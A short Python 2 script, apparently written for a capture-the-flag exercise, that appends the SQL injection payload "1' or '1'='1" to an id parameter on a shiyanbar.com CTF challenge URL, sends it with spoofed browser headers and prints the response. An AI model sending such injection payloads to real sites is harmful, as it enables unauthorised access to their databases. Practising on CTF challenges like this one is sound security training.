# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
url='http://ctf5.shiyanbar.com/423/web/?id='
#定义关键字测试使用的载荷库
#url=url+"1'%20or%20'1'='1"
url1="1' or '1'='1"
url=url+quote(url1)
print url
headers = {'Host':'ctf5.shiyanbar.com',
           'Connection':'keep-alive',
           'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
           'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0',
           'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
           'Accept-Encoding':'gzip, deflate',
           'Upgrade-Insecure-Requests':'1'
           }
data = None
req = urllib2.Request(url, data, headers)
res = urllib2.urlopen(req).read()

print req.get_full_url()+"\n"+res+"\n"


